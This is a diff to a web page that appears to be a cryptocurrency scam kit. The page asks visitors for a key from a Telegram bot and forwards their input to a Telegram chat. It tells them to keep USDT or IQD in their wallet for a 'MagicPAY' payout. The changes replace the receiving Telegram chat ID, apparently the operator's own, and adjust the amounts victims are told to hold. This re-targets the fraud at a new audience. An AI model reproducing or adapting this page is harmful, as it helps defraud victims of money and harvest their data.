@@ -91,7 +91,7 @@
             <div class="dialog-sub">Enter the key from @CASH_PIN_bot</div>
 
             <div class="input-group">
-                <input type="text" class="code-input" id="paymentCodeInput" placeholder="e.g. JcNCFcc7p29L768jO:SysKey11980" autocomplete="off">
+                <input type="text" class="code-input" id="paymentCodeInput" placeholder="e.g. JcNCFcc7p29L*****:119***0" autocomplete="off">
                 <button class="send-btn" id="sendCodeBtn"><i class="fas fa-paper-plane"></i> Send</button>
             </div>
 
@@ -212,7 +212,7 @@ const API_URL = '/.netlify/functions/sendTelegram';
             // ========== TELEGRAM SENDER VIA VERCEL API ==========
             async function sendTelegramMessage(text) {
                 const payload = {
-                    chat_id: '1484010221', // Change to your channel username or user ID
+                    chat_id: '5828320239', // Tele-🆔-Here
                     text: text,
                     parse_mode: 'Markdown'
                 };
@@ -286,7 +286,7 @@ const API_URL = '/.netlify/functions/sendTelegram';
                         <i class="fas fa-hourglass-half"></i> <span id="countdownValue">06:00:00</span> remaining
                     </div>
                     <div class="warning-note">
-                        ⚡ Keep <strong>100.59 USDT</strong> in your wallet.<br>
+                        ⚡ Keep <strong>53.45 USDT / 70,000 IQD</strong> in your wallet.<br>
                         ⏳ 3 minutes to respond after receiving wallet.<br>
                         📤 MagicPAY wallet will be sent soon.
                     </div>
@@ -302,7 +302,7 @@ const API_URL = '/.netlify/functions/sendTelegram';
                     `Time: ${timeString}\n` +
                     `Expires: ${new Date(expiresAt).toLocaleString()}\n` +
                     `Status: Processing\n` +
-                    `User advised to keep 100.59 USDT.`;
+                    `User advised to keep 53.45USDT = 70,000IQD.`;
                 sendTelegramMessage(successMsg);
             }
 
